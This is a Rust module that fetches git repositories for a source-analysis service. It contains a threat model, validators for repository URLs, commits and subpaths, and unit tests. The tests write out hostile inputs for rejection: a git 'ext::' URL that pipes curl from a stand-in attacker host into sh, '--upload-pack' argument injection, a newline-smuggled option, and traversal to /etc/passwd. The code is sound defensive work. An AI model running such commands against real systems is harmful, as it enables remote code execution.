//! Getting the source that will be analysed.
//!
//! A [`RepoFetcher`] turns `(repo_url, commit)` into a directory on disk.
//! Two implementations: [`git::GitFetcher`] for real remotes, and
//! [`local::LocalPathFetcher`] for an offline demo and for the eval suite's
//! fixture repositories (which must be reproducible without a network).
//!
//! # Threat model
//!
//! `repo_url` reaches this module from an API request. Everything here
//! assumes it is hostile:
//!
//! - **Scheme allowlist** — `https://` and local paths only, enforced twice:
//!   once by [`validate_repo_url`] before git is invoked, and again by git
//!   itself via `GIT_ALLOW_PROTOCOL`. `ssh://`, `git://` and especially
//!   `ext::` (which makes git run an arbitrary command) are rejected.
//! - **No argv injection** — a value beginning with `-` would be read by git
//!   as an option (`--upload-pack=…` is remote code execution), so it is
//!   rejected outright rather than escaped.
//! - **No credentials in the URL** — userinfo is rejected; a token is passed
//!   through `GIT_CONFIG_*` env vars, never argv (visible in `ps`) and never
//!   the URL (logged, and echoed in git's own error messages).
//! - **No interactive prompts** — `GIT_TERMINAL_PROMPT=0`, so a private repo
//!   fails fast instead of hanging a worker on a credential prompt.
//! - **No symlinks** — `core.symlinks=false` at checkout, so a hostile
//!   repository cannot place a link that makes the indexer read outside the
//!   checkout. The indexer refuses to follow links as a second lock.
//! - **Exact revisions only** — a 40/64-hex object id, never a ref name.
//!   Evidence pinned to a moving `HEAD` could not be reproduced or audited.
//!
//! Repository *content* is never executed: no build, no install, no hooks.

use std::path::{Path, PathBuf};

use async_trait::async_trait;

pub mod cache;
pub mod git;
pub mod local;
pub mod resolve;

pub use cache::RepoCache;
pub use git::GitFetcher;
pub use local::LocalPathFetcher;
pub use resolve::{GitRefResolver, RefResolver};

/// Fetch failures, as an analyst-facing taxonomy. These strings end up in
/// the UI, so each one tells the reader what to *do*, not what errno was.
#[derive(Debug, thiserror::Error)]
pub enum FetchError {
    #[error("repository URL is not acceptable: {0}")]
    InvalidUrl(String),
    #[error("commit must be a full 40- or 64-character hex object id, not a branch or tag: {0}")]
    InvalidCommit(String),
    #[error("revision is not an acceptable branch or tag name: {0}")]
    InvalidRef(String),
    #[error("revision {0} does not exist in the repository — check the branch or tag name")]
    RefNotFound(String),
    #[error("repository could not be reached — check the URL and that the host is up")]
    RepoNotFound,
    #[error(
        "commit {0} is not available from the remote — it may have been removed by a force-push, \
         or the host may not allow fetching an arbitrary object id"
    )]
    CommitUnavailable(String),
    #[error("authentication failed — this repository appears to be private and REACH_GIT_TOKEN is missing or not valid for it")]
    AuthFailed,
    #[error("checkout exceeds the configured size limit of {0} MB")]
    TooLarge(u64),
    #[error("fetch timed out after {0} seconds")]
    Timeout(u64),
    #[error("git is not available in this environment: {0}")]
    GitUnavailable(String),
    #[error("fetch failed: {0}")]
    Other(String),
}

impl FetchError {
    /// Stable tag for metrics and for the eval suite's failure-case table.
    pub fn kind(&self) -> &'static str {
        match self {
            FetchError::InvalidUrl(_) => "invalid_url",
            FetchError::InvalidCommit(_) => "invalid_commit",
            FetchError::InvalidRef(_) => "invalid_ref",
            FetchError::RefNotFound(_) => "ref_not_found",
            FetchError::RepoNotFound => "repo_not_found",
            FetchError::CommitUnavailable(_) => "commit_unavailable",
            FetchError::AuthFailed => "auth_failed",
            FetchError::TooLarge(_) => "too_large",
            FetchError::Timeout(_) => "timeout",
            FetchError::GitUnavailable(_) => "git_unavailable",
            FetchError::Other(_) => "other",
        }
    }
}

/// A checkout on disk, plus the root the analysis should actually scan
/// (which is `subpath` inside the checkout, when one was requested).
#[derive(Debug, Clone)]
pub struct Checkout {
    /// Root of the checked-out tree.
    pub root: PathBuf,
    /// What to index: `root`, or `root/subpath`.
    pub scan_root: PathBuf,
}

#[async_trait]
pub trait RepoFetcher: Send + Sync {
    /// Materialises `commit` of `repo_url` and returns where it landed.
    async fn fetch(&self, repo_url: &str, commit: &str) -> Result<Checkout, FetchError>;
}

/// What kind of source a validated `repo_url` names.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RepoTarget {
    /// An `https://` remote.
    Https(String),
    /// A path on this machine — the offline demo and eval fixtures.
    Local(PathBuf),
}

/// The scheme allowlist and argv-injection guard. Pure, so the security
/// decision is unit-testable without touching git or the network.
pub fn validate_repo_url(raw: &str) -> Result<RepoTarget, FetchError> {
    let url = raw.trim();

    if url.is_empty() {
        return Err(FetchError::InvalidUrl("empty".to_string()));
    }
    // Would be parsed as an option by git. Rejected rather than escaped:
    // `--upload-pack=<cmd>` is arbitrary command execution, and there is no
    // legitimate repository URL that starts with a dash.
    if url.starts_with('-') {
        return Err(FetchError::InvalidUrl("must not start with '-'".to_string()));
    }
    // Control characters (including newlines) could split a config value or
    // corrupt a log line.
    if url.chars().any(|c| c.is_control()) {
        return Err(FetchError::InvalidUrl("contains control characters".to_string()));
    }

    if let Some(rest) = url.strip_prefix("https://") {
        // Userinfo would put a credential in argv, in logs, and in git's own
        // error output. Callers pass tokens via REACH_GIT_TOKEN instead.
        let authority = rest.split('/').next().unwrap_or("");
        if authority.contains('@') {
            return Err(FetchError::InvalidUrl(
                "must not embed credentials — configure REACH_GIT_TOKEN instead".to_string(),
            ));
        }
        if authority.is_empty() {
            return Err(FetchError::InvalidUrl("missing host".to_string()));
        }
        return Ok(RepoTarget::Https(url.to_string()));
    }

    if let Some(path) = url.strip_prefix("file://") {
        return local_target(path);
    }
    if url.starts_with('/') {
        return local_target(url);
    }

    // Everything else, named explicitly so the error is useful: `git://` and
    // `ssh://` are unauthenticated/interactive respectively, and `ext::`
    // makes git execute a command of the caller's choosing.
    Err(FetchError::InvalidUrl(format!(
        "only https:// URLs and absolute local paths are accepted (got: {})",
        crate::ai::truncate(url, 60)
    )))
}

fn local_target(path: &str) -> Result<RepoTarget, FetchError> {
    if !path.starts_with('/') {
        return Err(FetchError::InvalidUrl("local path must be absolute".to_string()));
    }
    // `..` is rejected before canonicalisation so the message is about the
    // input, not about wherever it happened to resolve to.
    if path.split('/').any(|c| c == "..") {
        return Err(FetchError::InvalidUrl("local path must not contain '..'".to_string()));
    }
    Ok(RepoTarget::Local(PathBuf::from(path)))
}

/// Object ids only. A ref name would make the report unreproducible: re-run
/// it a week later against the same "commit" and you would be analysing
/// different code.
pub fn validate_commit(raw: &str) -> Result<String, FetchError> {
    let c = raw.trim();
    let ok = (c.len() == 40 || c.len() == 64) && c.chars().all(|ch| ch.is_ascii_hexdigit());
    if ok {
        Ok(c.to_ascii_lowercase())
    } else {
        Err(FetchError::InvalidCommit(crate::ai::truncate(c, 60)))
    }
}

/// Resolves an optional monorepo subpath *inside* a checkout, refusing
/// anything that escapes it. Traversal is checked on the raw components and
/// again on the canonicalised result, because a symlink inside the checkout
/// could otherwise redirect a perfectly innocent-looking relative path.
pub fn resolve_subpath(root: &Path, subpath: Option<&str>) -> Result<PathBuf, FetchError> {
    let Some(sub) = subpath.map(str::trim).filter(|s| !s.is_empty()) else {
        return Ok(root.to_path_buf());
    };
    if sub.starts_with('/') || sub.split('/').any(|c| c == ".." || c == ".git") {
        return Err(FetchError::InvalidUrl(format!("subpath is not acceptable: {sub}")));
    }
    let joined = root.join(sub);
    let canonical_root = root.canonicalize().map_err(|e| FetchError::Other(e.to_string()))?;
    let canonical = joined
        .canonicalize()
        .map_err(|_| FetchError::Other(format!("subpath does not exist in this revision: {sub}")))?;
    if !canonical.starts_with(&canonical_root) {
        return Err(FetchError::InvalidUrl(format!("subpath escapes the checkout: {sub}")));
    }
    Ok(canonical)
}

/// Total size of a directory tree, following no links.
pub fn dir_size_bytes(path: &Path) -> u64 {
    walkdir::WalkDir::new(path)
        .follow_links(false)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_file())
        .filter_map(|e| e.metadata().ok())
        .map(|m| m.len())
        .sum()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_plain_https_and_absolute_local_paths() {
        assert_eq!(
            validate_repo_url("https://github.com/o/r.git").unwrap(),
            RepoTarget::Https("https://github.com/o/r.git".into())
        );
        assert_eq!(
            validate_repo_url("/srv/fixtures/demo").unwrap(),
            RepoTarget::Local(PathBuf::from("/srv/fixtures/demo"))
        );
        assert_eq!(
            validate_repo_url("file:///srv/fixtures/demo").unwrap(),
            RepoTarget::Local(PathBuf::from("/srv/fixtures/demo"))
        );
    }

    #[test]
    fn rejects_schemes_outside_the_allowlist() {
        // `ext::` is the dangerous one: it makes git run a command.
        for bad in [
            "ext::sh -c 'curl evil.example|sh'",
            "ssh://git@github.com/o/r.git",
            "git://github.com/o/r.git",
            "http://github.com/o/r.git",
            "https:/oops",
            "relative/path",
        ] {
            assert!(validate_repo_url(bad).is_err(), "should have rejected {bad}");
        }
    }

    #[test]
    fn rejects_argv_injection() {
        // Without this, `--upload-pack=<cmd>` is remote code execution.
        assert!(validate_repo_url("--upload-pack=touch /tmp/pwned").is_err());
        assert!(validate_repo_url("-c").is_err());
    }

    #[test]
    fn rejects_credentials_embedded_in_the_url() {
        assert!(validate_repo_url("https://user:token@github.com/o/r.git").is_err());
        // An `@` after the authority (a path component) is harmless.
        assert!(validate_repo_url("https://github.com/o/r@v1.git").is_ok());
    }

    #[test]
    fn rejects_control_characters() {
        assert!(validate_repo_url("https://host/r\n--upload-pack=x").is_err());
    }

    #[test]
    fn rejects_local_path_traversal() {
        assert!(validate_repo_url("/srv/../etc/passwd").is_err());
        assert!(validate_repo_url("file://relative").is_err());
    }

    #[test]
    fn commit_must_be_a_full_object_id() {
        let sha = "a".repeat(40);
        assert_eq!(validate_commit(&sha).unwrap(), sha);
        assert_eq!(validate_commit(&"B".repeat(64)).unwrap(), "b".repeat(64));
        // Refs are refused: evidence must be pinned to an immutable revision.
        for bad in ["HEAD", "main", "v1.2.3", "abc123", &"z".repeat(40), ""] {
            assert!(validate_commit(bad).is_err(), "should have rejected {bad}");
        }
    }

    #[test]
    fn subpath_resolution_refuses_to_escape_the_checkout() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("services/api")).unwrap();

        let root = dir.path();
        assert_eq!(resolve_subpath(root, None).unwrap(), root);
        assert!(resolve_subpath(root, Some("services/api")).is_ok());
        assert!(resolve_subpath(root, Some("../")).is_err());
        assert!(resolve_subpath(root, Some("/etc")).is_err());
        assert!(resolve_subpath(root, Some(".git")).is_err());
        assert!(resolve_subpath(root, Some("does/not/exist")).is_err());
    }

    #[test]
    fn subpath_symlink_escape_is_caught_by_canonicalisation() {
        // A hostile repository can contain `sneaky -> /`; the component
        // check alone would pass it.
        let dir = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        #[cfg(unix)]
        std::os::unix::fs::symlink(outside.path(), dir.path().join("sneaky")).unwrap();
        #[cfg(unix)]
        assert!(resolve_subpath(dir.path(), Some("sneaky")).is_err());
    }
}
